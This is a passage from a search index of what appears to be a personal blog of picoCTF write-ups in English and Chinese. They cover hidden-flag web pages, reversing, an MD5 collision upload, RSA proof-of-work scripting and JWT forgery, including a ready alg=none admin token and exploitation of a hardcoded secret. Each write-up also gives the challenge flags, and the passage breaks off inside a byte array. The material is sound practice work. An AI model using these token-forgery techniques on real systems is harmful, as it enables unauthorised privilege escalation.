class=\u0026#34;tabcontent\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;How\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;I used these to make this site: \u0026lt;br/\u0026gt; HTML \u0026lt;br/\u0026gt; CSS \u0026lt;br/\u0026gt; JS (JavaScript) \u0026lt;/p\u0026gt; \u0026lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; CSS Download it and search specific string\n$ strings mycss.css | grep \u0026#34;flag\u0026#34; /* You need CSS to make pretty pages. Here\u0026#39;s part 2/3 of the flag: t3ct1ve_0r_ju5t */ Javascript Combine the fragment flag: picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3} "},{"id":271,"href":"/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/","title":"PicoCTF - Investigative Reversing 0","section":"Securities","content":" PicoCTF - Investigative Reversing 0 # tags: PicoCTF CTF Misc # Challenge: Investigative Reversing 0\nBackground # fputc() - C語言庫函數 C/C++ fread 用法與範例 C中fread()函数的返回值 C语言之1ULL/1UL/1L区别\nSource code - IDA # :::spoiler source code\nint __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-4Ch] int j; // [rsp+8h] [rbp-48h] FILE *stream; // [rsp+10h] [rbp-40h] FILE *v8; // [rsp+18h] [rbp-38h] char ptr[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v10; // [rsp+48h] [rbp-8h] v10 = __readfsqword(40u); stream = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); v8 = fopen(\u0026#34;mystery.png\u0026#34;, \u0026#34;a\u0026#34;); if ( !stream ) puts(\u0026#34;No flag found, please make sure this is run on the server\u0026#34;); if ( !v8 ) puts(\u0026#34;mystery.png is missing, please run this on the server\u0026#34;); if ( (int)fread(ptr, 26uLL, 1uLL, stream) \u0026lt;= 0 ) exit(0); puts(\u0026#34;at insert\u0026#34;); fputc(ptr[0], v8); fputc(ptr[1], v8); fputc(ptr[2], v8); fputc(ptr[3], v8); fputc(ptr[4], v8); fputc(ptr[5], v8); for ( i = 6; i \u0026lt;= 14; ++i ) fputc((char)(ptr[i] + 5), v8); fputc((char)(ptr[15] - 3), v8); for ( j = 16; j \u0026lt;= 25; ++j ) fputc(ptr[j], v8); fclose(v8); fclose(stream); return __readfsqword(40u) ^ v10; } :::\nExploit # Analyze source code First, it open mystery.png and flag.txt file and read 26 characters in flag.txt Then it append first 6 characters to mystery.png and do some disalignment like rot13.\nIn addition\u0026hellip; Observing mystery.png by HxD Seems we got a flag-like answer.\nRecover it The first 6 character can copy paste. K€k5zsid6 $\\to$ F{f0und_1 by minusing 5 based on ascii table q $\\to$ t by adding 3 based on ascii table again The rest strings still copy paste again Then we got flag\u0026hellip; $\\to$ picoCTF{f0und_1t_3d659f57}\n"},{"id":272,"href":"/security/practice/picoctf/web/picoctf---it-is-my-birthday/","title":"PicoCTF - It is my Birthday","section":"Securities","content":" PicoCTF - It is my Birthday # tags: PicoCTF CTF Web # Challenge: It is my Birthday\nBackground # corkami/collisions\nExploit - MD5 Collision # Try to find different pdf file that has same MD5 hash Such as the example provided by corkami - poeMD5_A and poeMD5_B Note that, you must notice the file size you uploaded can not too large.\nSource code - After Exploit # :::spoiler after exploit you can get the source code \u0026amp; flag\n\u0026lt;?php if (isset($_POST[\u0026#34;submit\u0026#34;])) { $type1 = $_FILES[\u0026#34;file1\u0026#34;][\u0026#34;type\u0026#34;]; $type2 = $_FILES[\u0026#34;file2\u0026#34;][\u0026#34;type\u0026#34;]; $size1 = $_FILES[\u0026#34;file1\u0026#34;][\u0026#34;size\u0026#34;]; $size2 = $_FILES[\u0026#34;file2\u0026#34;][\u0026#34;size\u0026#34;]; $SIZE_LIMIT = 18 * 1024; if (($size1 \u0026lt; $SIZE_LIMIT) \u0026amp;\u0026amp; ($size2 \u0026lt; $SIZE_LIMIT)) { if (($type1 == \u0026#34;application/pdf\u0026#34;) \u0026amp;\u0026amp; ($type2 == \u0026#34;application/pdf\u0026#34;)) { $contents1 = file_get_contents($_FILES[\u0026#34;file1\u0026#34;][\u0026#34;tmp_name\u0026#34;]); $contents2 = file_get_contents($_FILES[\u0026#34;file2\u0026#34;][\u0026#34;tmp_name\u0026#34;]); if ($contents1 != $contents2) { if (md5_file($_FILES[\u0026#34;file1\u0026#34;][\u0026#34;tmp_name\u0026#34;]) == md5_file($_FILES[\u0026#34;file2\u0026#34;][\u0026#34;tmp_name\u0026#34;])) { highlight_file(\u0026#34;index.php\u0026#34;); die(); } else { echo \u0026#34;MD5 hashes do not match!\u0026#34;; die(); } } else { echo \u0026#34;Files are not different!\u0026#34;; die(); } } else { echo \u0026#34;Not a PDF!\u0026#34;; die(); } } else { echo \u0026#34;File too large!\u0026#34;; die(); } } // FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_aebcbf39} ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;It is my Birthday\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;text-muted\u0026#34;\u0026gt;It is my Birthday\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-xs-12 col-sm-12 col-md-12\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;See if you are invited to my party!\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;div class=\u0026#34;upload-form\u0026#34;\u0026gt; \u0026lt;form role=\u0026#34;form\u0026#34; action=\u0026#34;/index.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file1\u0026#34; id=\u0026#34;file1\u0026#34; class=\u0026#34;form-control input-lg\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file2\u0026#34; id=\u0026#34;file2\u0026#34; class=\u0026#34;form-control input-lg\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-xs-12 col-sm-12 col-md-12\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-lg btn-success btn-block\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;footer class=\u0026#34;footer\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026amp;copy; PicoCTF\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function(){ $(\u0026#34;.close\u0026#34;).click(function(){ $(\u0026#34;myAlert\u0026#34;).alert(\u0026#34;close\u0026#34;); }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\nReference # "},{"id":273,"href":"/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/","title":"PicoCTF - It's Not My Fault 1","section":"Securities","content":" PicoCTF - It\u0026rsquo;s Not My Fault 1 # tags: PicoCTF CTF Crypto # Background # Source code # :::spoiler Source code\n#!/usr/bin/python3 -u import random import string import hashlib import time from Crypto.Util.number import inverse, getPrime, bytes_to_long, GCD from sympy.ntheory.modular import solve_congruence FLAG = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;).read() def CRT(a, m, b, n): val, mod = solve_congruence((a, m), (b, n)) return val def gen_key(): while True: p = getPrime(512) q = getPrime(512) if GCD(p-1, q-1) == 2: return p, q def get_clue(p, q, BITS): while True: d_p = random.randint(1, 1 \u0026lt;\u0026lt; BITS) d_q = random.randint(1, q - 1) if d_p % 2 == d_q % 2: d = CRT(d_p, p - 1, d_q, q - 1) e = inverse(d, (p - 1) * (q - 1)) print(\u0026#34;Clue : \u0026#34;, e) return def get_flag(p, q): start = time.time() ans = int(input()) if (time.time() - start) \u0026gt; (15 * 60): print(\u0026#34;Too long!\u0026#34;) exit() else: if ans == p + q: print(FLAG) else: print(\u0026#34;oops...\u0026#34;) #PoW vals1 = \u0026#34;\u0026#34;.join([random.choice(string.digits) for _ in range(5)]) vals2 = \u0026#34;\u0026#34;.join([random.choice(string.hexdigits.lower()) for _ in range(6)]) user_input = input(\u0026#34;Enter a string that starts with \\\u0026#34;{}\\\u0026#34; (no quotes) which creates an md5 hash that ends in these six hex digits: {}\\n\u0026#34;.format(vals1, vals2)) user_hash = hashlib.md5(user_input.encode()).hexdigest() if user_input[:5] == vals1 and user_hash[-6:] == vals2: p, q = gen_key() n = p * q print(\u0026#34;Public Modulus : \u0026#34;, n) get_clue(p, q, 20) get_flag(p, q) :::\n一開始先設立PoW的Challenge，之後才進到RSA的部分 可以看到在54行先產出大質數$p$, $q$，並把$n$ release出來 隨後進到get_clue function，可以看到他先create一個$d_q$和$d_p$，且$d_p$的range被限制在$(1,\\ 2^{20}=1048576)$ 在28行的地方進入CRT function，這一段是在找一個$d$使其符合中國餘式定理，也就是: $$ d\\ %\\ m=a\\ d\\ %\\ n=b $$ 帶入參數就是 $$ d\\ %\\ (p-1)=d_p\\ d\\ %\\ (q-1)=d_q $$ Recon # 這一題超難，看了三篇Write Up還是看不懂其中的原理\nExploit # Prove of Work from pwn import * from tqdm import trange import hashlib context.arch = \u0026#39;amd64\u0026#39; # r = process([\u0026#39;python\u0026#39;, \u0026#39;not_my_fault.py\u0026#39;]) r = remote(\u0026#39;mercury.picoctf.net\u0026#39;, 41175) r.recvuntil(b\u0026#39;Enter a string that starts with \u0026#34;\u0026#39;) tmp = r.recvline().strip().decode() value1 = tmp.split(\u0026#39;\u0026#34;\u0026#39;)[0] value2 = tmp.split(\u0026#34;: \u0026#34;)[-1] log.info(\u0026#34;Prefix = {}, Postfix = {}\u0026#34;.format(value1, value2)) for i in trange(20000000000): guess_collision = hashlib.md5((value1 + str(i)).encode()).hexdigest() if guess_collision[-6:] == value2: r.sendline((value1 + str(i)).encode()) print(\u0026#34;Collision Found: {}\u0026#34;.format(value1 + str(i))) break r.interactive() Reference # maple3142 - It\u0026rsquo;s Not My Fault 1 It\u0026rsquo;s Not My Fault 1 - Write Up Attack on CRT-RSA picoCTF 2021 It\u0026rsquo;s Not My Fault 1 - Video\n"},{"id":274,"href":"/security/practice/picoctf/web/picoctf---jauth/","title":"PicoCTF - JAUTH","section":"Securities","content":" PicoCTF - JAUTH # Background # NTUCNS - HW3 - JWT Authentication\nExploit - JWR + None # 其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign\n用類似jwt.io的網站(online tool)，但支援alg=none的編碼 Payload: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ Flag: picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}\nReference # picoCTF : JAUTH (Challenge 8) "},{"id":275,"href":"/security/practice/picoctf/web/picoctf---java-code-analysis_/","title":"PicoCTF - Java Code Analysis!?!","section":"Securities","content":" PicoCTF - Java Code Analysis!?! # Background # JWT\nSource code # Too Much to list\nHint # Maybe try to find the JWT Signing Key (\u0026ldquo;secret key\u0026rdquo;) in the source code? Maybe it\u0026rsquo;s hardcoded somewhere? Or maybe try to crack it? The \u0026lsquo;role\u0026rsquo; and \u0026lsquo;userId\u0026rsquo; fields in the JWT can be of interest to you! The \u0026lsquo;controllers\u0026rsquo;, \u0026lsquo;services\u0026rsquo; and \u0026lsquo;security\u0026rsquo; java packages in the given source code might need your attention. We\u0026rsquo;ve provided a README.md file that contains some documentation. Upgrade your \u0026lsquo;role\u0026rsquo; with the new (cracked) JWT. And re-login for the new role to get reflected in browser\u0026rsquo;s localStorage. Recon # 這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關\n先用user/user登入觀察整個網站 發現書架上只有三本書，而且個別的權限都標註在上面(Free/Premium/Admin)，看起來我們的目標是把自己的權限變成admin然後查看flag這本書 JWT Token 用online tool查看的結果如下，首要目標是找到HS256的secret key Exploit - JWT # 找Secret key 隨便找找，發現在./src/main/java/io/github/nandandesai/pico/security/models/SecretGenerator.java的SecretGenerator class :::spoiler Source Code\npackage io.github.nandandesai.pico.security; import io.github.nandandesai.pico.configs.UserDataPaths; import io.github.nandandesai.pico.utils.FileOperation; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.io.IOException; import java.nio.charset.Charset; @Service class SecretGenerator { private Logger logger = LoggerFactory.getLogger(SecretGenerator.class); private static final String SERVER_SECRET_FILENAME = \u0026#34;server_secret.txt\u0026#34;; @Autowired private UserDataPaths userDataPaths; private String generateRandomString(int len) { // not so random return \u0026#34;1234\u0026#34;; } String getServerSecret() { try { String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset()); logger.info(\u0026#34;Server secret successfully read from the filesystem. Using the same for this runtime.\u0026#34;); return secret; }catch (IOException e){ logger.info(SERVER_SECRET_FILENAME+\u0026#34; file doesn\u0026#39;t exists or something went wrong in reading that file. Generating a new secret for the server.\u0026#34;); String newSecret = generateRandomString(32); try { FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes()); } catch (IOException ex) { ex.printStackTrace(); } logger.info(\u0026#34;Newly generated secret is now written to the filesystem for persistence.\u0026#34;); return newSecret; } } } ::: 可以發現作者的註解說not so random，secret key是1234，把key拿到jwt online decoder做驗證，發現signature是正確的\nConstruct a Fake Token 根據hint的說明，我們應該只要改userId和role這兩個欄位如下，切記也要改token-payload如下，就可以更改自己的權限 Flag: picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}\nReference # picoCTF 2023 Java Code Analysis?!? "},{"id":276,"href":"/security/practice/picoctf/web/picoctf---java-script-kiddie/","title":"PicoCTF - Java Script Kiddie","section":"Securities","content":" PicoCTF - Java Script Kiddie # Background # JavaScript Array slice()\nconst fruits = [\u0026#34;Banana\u0026#34;, \u0026#34;Orange\u0026#34;, \u0026#34;Lemon\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Mango\u0026#34;]; const citrus = fruits.slice(1, 3); # output: Orange,Lemon JavaScript Uint8Array.from() Method\nlet array = Uint8Array.from(\u0026#39;45465768654323456\u0026#39;); console.log(array); # output: Uint8Array(17) [ 4, 5, 4, 6, 5, 7, 6, 8, 6, 5, 4, 3, 2, 3, 4, 5, 6 ] JavaScript String.fromCharCode()\nlet text = String.fromCharCode(65); console.log(text) # output: A Source code # :::spoiler Source Code\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script src=\u0026#34;jquery-3.3.1.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var bytes = []; $.get(\u0026#34;bytes\u0026#34;, function(resp) { bytes = Array.from(resp.split(\u0026#34; \u0026#34;), x =\u0026gt; Number(x)); }); function assemble_png(u_in){ var LEN = 16; var key = \u0026#34;0000000000000000\u0026#34;; var shifter; if(u_in.length == LEN){ key = u_in; } var result = []; for(var i = 0; i \u0026lt; LEN; i++){ shifter = key.charCodeAt(i) - 48; for(var j = 0; j \u0026lt; (bytes.length / LEN); j ++){ result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i] } } while(result[result.length-1] == 0){ result = result.slice(0,result.length-1); } document.getElementById(\u0026#34;Area\u0026#34;).src = \u0026#34;data:image/png;base64,\u0026#34; + btoa(String.fromCharCode.apply(null, new Uint8Array(result))); return false; } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;form action=\u0026#34;#\u0026#34; onsubmit=\u0026#34;assemble_png(document.getElementById(\u0026#39;user_in\u0026#39;).value)\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;user_in\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;img id=\u0026#34;Area\u0026#34; src=\u0026#34;\u0026#34;/\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\nRecon # 這一題很難，應該說scramble的方式很難看出來，而且他結合了web(js)/reverse/misc的各種概念在裡面，討論的WP也比較少，沒有甚麼script可以參考，但1這一部影片討論的非常詳細，再搭配自己寫的script就可以尻出原本的圖檔\n首先題目的頁面剛載入的時候，會直接傳送一個bytes的矩陣，內涵720個bytes，也就是Code:5-8在做的事情(記得善用browser內建的debugger和觀察network封包) 接著，如果甚麼都不輸入，他會直接執行assemble_png這個function(也就是Code:10-29)，這個function簡單來說就是descrable這些bytes，可以想像他用封包傳送過來的是已經打亂的bytes，所以他現在要還原 具體怎麼還原可以用debugger跟一下，反正他的做法簡單來說就是他的原圖檔中每一行做輪轉，就像下圖一樣，我只有截第一行，其他以此類推，所以我們要怎麼回推回去呢?只要寫過一點Misc/修復png檔之類的題目的人應該對magic header不陌生，反正前面都長，那我們就直接回推到最一開始的狀態就好 而輪轉的次數介於0-9之間，所以可以像2的作法一樣，用看的，或是用1的script(當然我有做一點修改，見註一)，而我們輸入的key長度是16，就是代表16行各自需要輪轉幾次回來，這樣我們就可以拿到一張正常的圖片 問題：如果看其他人的WP，因為圖片不一樣，所以當然scramble bytes也會不一樣，但其他人好像沒有多個候選key的問題，也就是同一行中，在0-9的區間有超過一個一樣的bytes，這樣到底怎麼知道要輪轉幾次才會回到一開始的地方，比方說0x08這一行，應該要是0x00，但有多達三個0x00，這樣要怎麼知道輪轉2/3/4次?我自己的做法會是直接當成一個候選的key然後都try try看，以這個例子來說，就會多達3*4*3=36種組合 註一: 修改的地方在於前面的known_bytes，因為Walkthru的作法是前8bytes對照png前面的magic header，而後8bytes就看最後面的IEND block，但因為Code:24-26的while loop會把多餘的padding截掉，也就是說圖檔的bytes length不會和一開始打亂後的一樣，這樣在輪轉讓就沒辦法alignment，所以我就直接參考2的作法，也就是全部16bytes都依照第一列的16bytes當作對照，也就是[0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]，而這樣的結果就是有多達36種組合會出現，所以我才會寫一個自動填入候選key的script，這樣省了一點時間\nExploit - Reverse / Javascript / Misc # :::spoiler 把bytes寫入圖片檔中\nct = [87, 130, 78, 188, 0, 84, 26, 157, 143, 239, 249, 82, 248, 212, 239, 82, 195, 80, 1, 207, 13, 6, 1, 0, 119, 243, 73, 193, 78, 36, 133, 108, 85, 0, 0, 14, 0, 186, 68, 0, 0, 222, 0, 243, 0, 24, 174, 163, 126, 0, 133, 252, 137, 177, 121, 10, 0, 0, 0, 237, 73, 63, 0, 100, 96, 20, 3, 224, 59, 171, 16, 114, 0, 0, 0, 69, 0, 68, 68, 147, 137, 179, 110, 112, 74, 121, 238, 65, 1, 0, 156, 0, 155, 0, 95, 120, 0, 233, 226, 40, 78, 194, 248, 44, 84, 0, 208, 13, 41, 72, 138, 59, 164, 98, 71, 0, 209, 0, 99, 176, 97, 120, 202, 0, 135, 192, 54, 101, 64, 252, 81, 71, 205, 10, 243, 133, 30, 22, 125, 237, 3, 93, 90, 42, 73, 221, 25, 114, 243, 0, 116, 22, 4, 3, 59, 75, 188, 119, 169, 221, 161, 184, 178, 2, 73, 73, 231, 45, 14, 99, 102, 153, 166, 178, 206, 54, 127, 84, 240, 191, 220, 10, 163, 81, 64, 206, 128, 132, 102, 197, 72, 127, 239, 253, 78, 93, 8, 22, 239, 207, 146, 111, 143, 239, 27, 243, 28, 0, 173, 159, 196, 48, 247, 28, 84, 98, 63, 52, 171, 214, 214, 26, 233, 254, 65, 106, 111, 59, 73, 255, 148, 111, 103, 91, 20, 206, 222, 70, 252, 199, 161, 124, 245, 188, 102, 81, 159, 119, 174, 51, 190, 243, 55, 243, 156, 249, 124, 125, 2, 143, 191, 27, 119, 139, 126, 88, 18, 247, 171, 227, 72, 66, 54, 251, 0, 80, 171, 146, 113, 173, 4, 79, 211, 216, 214, 122, 119, 115, 225, 45, 24, 54, 44, 76, 43, 253, 5, 235, 104, 248, 96, 8, 229, 200, 75, 64, 233, 217, 23, 87, 40, 254, 187, 107, 181, 200, 181, 233, 181, 81, 231, 171, 165, 82, 254, 196, 239, 51, 43, 114, 170, 73, 249, 50, 114, 201, 138, 64, 11, 203, 155, 192, 249, 226, 35, 188, 156, 223, 40, 217, 67, 75, 100, 45, 93, 102, 169, 13, 34, 197, 80, 175, 210, 128, 137, 201, 167, 45, 140, 82, 171, 56, 212, 17, 126, 113, 139, 229, 127, 223, 181, 15, 0, 116, 221, 186, 219, 230, 56, 233, 31, 15, 249, 74, 119, 152, 44, 41, 226, 60, 35, 253, 172, 97, 32, 137, 233, 165, 35, 181, 104, 80, 217, 56, 186, 205, 212, 15, 64, 81, 230, 230, 153, 62, 251, 251, 47, 151, 141, 108, 32, 25, 65, 11, 253, 119, 201, 147, 243, 11, 31, 247, 233, 54, 126, 217, 136, 141, 191, 226, 137, 213, 131, 239, 100, 145, 151, 150, 119, 124, 159, 203, 190, 63, 18, 170, 210, 175, 122, 223, 223, 114, 124, 59, 93, 245, 177, 100, 15, 57, 63, 239, 165, 144, 13, 149, 32, 198, 39, 52, 53, 113, 97, 91, 186, 76, 91, 74, 207, 133, 208, 0, 245, 241, 245, 73, 122, 193, 223, 159, 82, 175, 241, 159, 231, 205, 24, 92, 75, 11, 247, 77, 55, 170, 7, 95, 127, 143, 96, 207, 242, 142, 153, 226, 242, 93, 163, 110, 185, 26, 188, 4, 178, 102, 159, 97, 53, 58, 186, 172, 239, 6, 78, 215, 65, 156, 90, 150, 112, 205, 73, 76, 149, 163, 159, 242, 45, 147, 16, 210, 49, 254, 82, 126, 200, 30, 62, 190, 230, 2, 86, 171, 181, 197, 185, 132, 170, 153, 82, 191, 154, 235, 147, 55, 57, 92, 252, 48, 207, 118, 191, 170, 253, 53, 127, 94, 143, 122, 230, 254, 154, 151, 186, 55, 160, 132, 126, 57, 183, 217, 129, 181, 95, 255, 35, 223, 50, 70, 77, 107, 100, 203, 17, 61, 163, 17, 227, 147, 182, 184, 79, 126, 239, 28, 115, 159, 254, 111, 90, 250, 14, 206, 185, 137, 187, 141, 231, 211, 241, 249, 39, 99, 131, 95, 210, 50, 147, 241, 95, 127, 103, 239, 113, 165, 223, 164, 245, 35, 231, 132, 166, 220, 241, 207, 67, 178, 148, 29, 156, 94, 194, 74, 222, 110, 0, 243, 107, 158, 173, 214, 210, 249, 84, 66, 107, 40, 0, 203, 138, 164, 0, 241, 9, 109, 147, 207, 85, 29, 204, 0] f = open(\u0026#39;./PicoCTF/Web/Java Script Kiddie/cipher_flag.png\u0026#39;, \u0026#39;wb\u0026#39;) pt = b\u0026#39;\u0026#39; count = 0 for i in range(len(ct)): pt += bytes([ct[i]]) f.write(pt) f.close() :::\n:::spoiler 找key\nct = [87, 130, 78, 188, 0, 84, 26, 157, 143, 239, 249, 82, 248, 212, 239, 82, 195, 80, 1, 207, 13, 6, 1, 0, 119, 243, 73, 193, 78, 36, 133, 108, 85, 0, 0, 14, 0, 186, 68, 0, 0, 222, 0, 243, 0, 24, 174, 163, 126, 0, 133, 252, 137, 177, 121, 10, 0, 0, 0, 237, 73, 63, 0, 100, 96, 20, 3, 224, 59, 171, 16, 114, 0, 0, 0, 69, 0, 68, 68, 147, 137, 179, 110, 112, 74, 121, 238, 65, 1, 0, 156, 0, 155, 0, 95, 120, 0, 233, 226, 40, 78, 194, 248, 44, 84, 0, 208, 13, 41, 72, 138, 59, 164, 98, 71, 0, 209, 0, 99, 176, 97, 120, 202, 0, 135, 192, 54, 101, 64, 252, 81, 71, 205, 10, 243, 133, 30, 22, 125, 237, 3, 93, 90, 42, 73, 221, 25, 114, 243, 0, 116, 22, 4, 3, 59, 75, 188, 119, 169, 221, 161, 184, 178, 2, 73, 73, 231, 45, 14, 99, 102, 153, 166, 178, 206, 54, 127, 84, 240, 191, 220, 10, 163, 81, 64, 206, 128, 132, 102, 197, 72, 127, 239, 253, 78, 93, 8, 22, 239, 207, 146, 111, 143, 239, 27, 243, 28, 0, 173, 159, 196, 48, 247, 28, 84, 98, 63, 52, 171, 214, 214, 26, 233, 254, 65, 106, 111, 59, 73, 255, 148, 111, 103, 91, 20, 206, 222, 70, 252, 199, 161, 124, 245, 188, 102, 81, 159, 119, 174, 51, 190, 243, 55, 243, 156, 249, 124, 125, 2, 143, 191, 27, 119, 139, 126, 88, 18, 247, 171, 227, 72, 66, 54, 251, 0, 80, 171, 146, 113, 173, 4, 79, 211, 216, 214, 122, 119, 115, 225, 45, 24, 54, 44, 76, 43, 253, 5, 235, 104, 248, 96, 8, 229, 200, 75, 64, 233, 217, 23, 87, 40, 254, 187, 107, 181, 200, 181, 233, 181, 81, 231, 171, 165, 82, 254, 196, 239, 51, 43, 114, 170, 73, 249, 50, 114, 201, 138, 64, 11, 203, 155, 192, 249, 226, 35, 188, 156, 223, 40, 217, 67, 75, 100, 45, 93, 102, 169, 13, 34, 197, 80, 175, 210, 128, 137, 201, 167, 45, 140, 82, 171, 56, 212, 17, 126, 113, 139, 229, 127, 223, 181, 15, 0, 116, 221, 186, 219, 230, 56, 233, 31, 15, 249, 74, 119, 152, 44, 41, 226, 60, 35, 253, 172, 97, 32, 137, 233, 165, 35, 181, 104, 80, 217, 56, 186, 205, 212, 15, 64, 81, 230, 230, 153, 62, 251, 251, 47, 151, 141, 108, 32, 25, 65, 11, 253, 119, 201, 147, 243, 11, 31, 247, 233, 54, 126, 217, 136, 141, 191, 226, 137, 213, 131, 239, 100, 145, 151, 150, 119, 124, 159, 203, 190, 63, 18, 170, 210, 175, 122, 223, 223, 114, 124, 59, 93, 245, 177, 100, 15, 57, 63, 239, 165, 144, 13, 149, 32, 198, 39, 52, 53, 113, 97, 91, 186, 76, 91, 74, 207, 133, 208, 0, 245, 241, 245, 73, 122, 193, 223, 159, 82, 175, 241, 159, 231, 205, 24, 92, 75, 11, 247, 77, 55, 170, 7, 95, 127, 143, 96, 207, 242, 142, 153, 226, 242, 93, 163, 110, 185, 26, 188, 4, 178, 102, 159, 97, 53, 58, 186, 172, 239, 6, 78, 215, 65, 156, 90, 150, 112, 205, 73, 76, 149, 163, 159, 242, 45, 147, 16, 210, 49, 254, 82, 126, 200, 30, 62, 190, 230, 2, 86, 171, 181, 197, 185, 132, 170, 153, 82, 191, 154, 235, 147, 55, 57, 92, 252, 48, 207, 118, 191, 170, 253, 53, 127, 94, 143, 122, 230, 254, 154, 151, 186, 55, 160, 132, 126, 57, 183, 217, 129, 181, 95, 255, 35, 223, 50, 70, 77, 107, 100, 203, 17, 61, 163, 17, 227, 147, 182, 184, 79, 126, 239, 28, 115, 159, 254, 111, 90, 250, 14, 206, 185, 137, 187, 141, 231, 211, 241, 249, 39, 99, 131, 95, 210, 50, 147, 241, 95, 127, 103, 239, 113, 165, 223, 164, 245, 35, 231, 132, 166, 220, 241, 207, 67, 178, 148, 29, 156, 94, 194, 74, 222, 110, 0, 243, 107, 158, 173, 214, 210, 249, 